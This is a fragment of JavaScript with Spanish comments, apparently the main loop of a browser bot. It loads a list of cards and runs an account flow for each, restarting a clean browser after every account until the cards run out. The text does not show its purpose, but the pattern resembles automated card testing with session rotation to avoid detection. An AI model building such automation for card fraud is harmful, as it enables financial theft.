    await bot.loadAllTarjetas();
    await bot.initialize();

    try {
        while (true) {
            await bot.rotacionManualSiToca();

            // Ejecutar una cuenta completa
            const seguir = await bot.executeFlowCuenta();

            // 🔥 Cerrar navegador al terminar la cuenta
            await bot.close();

            // 🔥 Abrir navegador NUEVO y limpio
            await bot.initialize();

            if (!seguir) {
                await bot.log("🚫 No hay más tarjetas — BOT FINALIZADO.");
                break;
            }
        }
    } catch (e) {
        console.error("❌ ERROR GENERAL:", e.message);
    }

    await bot.close();
})();